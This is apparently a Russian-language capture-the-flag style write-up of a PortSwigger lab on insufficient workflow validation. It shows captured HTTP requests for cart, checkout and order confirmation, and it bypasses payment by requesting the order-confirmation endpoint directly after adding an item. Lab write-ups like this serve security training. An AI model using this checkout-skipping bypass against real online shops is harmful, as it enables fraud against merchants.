---
title: "Insufficient workflow validation"
date: 2025-10-30
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation"
classes: wide
---

Для прохождения нужно купить `Lightweight l33t leather jacket`. Для входа в учетную запись есть креды `wiener`:`peter`.

```
https://0ae700e003e905dd811b3f0e00ff0002.web-security-academy.net/
```

# Solution

Зайду в личный кабинет, попробую собрать различные варианты запросов.

Добавление товара в корзину:

```http
POST /cart HTTP/2
Host: 0ae700e003e905dd811b3f0e00ff0002.web-security-academy.net
Cookie: session=ii4c9RiowvaXnZktNrhoLC5gpwZUGoPc
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ae700e003e905dd811b3f0e00ff0002.web-security-academy.net/product?productId=14
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: https://0ae700e003e905dd811b3f0e00ff0002.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

productId=14&redir=PRODUCT&quantity=1
```

Покупка товара:

```http
POST /cart/checkout HTTP/2
Host: 0ae700e003e905dd811b3f0e00ff0002.web-security-academy.net
Cookie: session=ii4c9RiowvaXnZktNrhoLC5gpwZUGoPc
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ae700e003e905dd811b3f0e00ff0002.web-security-academy.net/cart
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: https://0ae700e003e905dd811b3f0e00ff0002.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=i4U0M2bJTCiBDeyJ1MHmC3qVQbVxjxUR
```

Подтверждение заказа:

```http
GET /cart/order-confirmation?order-confirmed=true HTTP/2
Host: 0ae700e003e905dd811b3f0e00ff0002.web-security-academy.net
Cookie: session=ii4c9RiowvaXnZktNrhoLC5gpwZUGoPc
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ae700e003e905dd811b3f0e00ff0002.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Хмм. Не вижу ни одной причины, чтобы не попробовать добавить жилет в корзину, а затем не отправить запрос на `/cart/order-confirmation`:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_insufficient-workflow-validation/1.png){: height="200" .align-center}
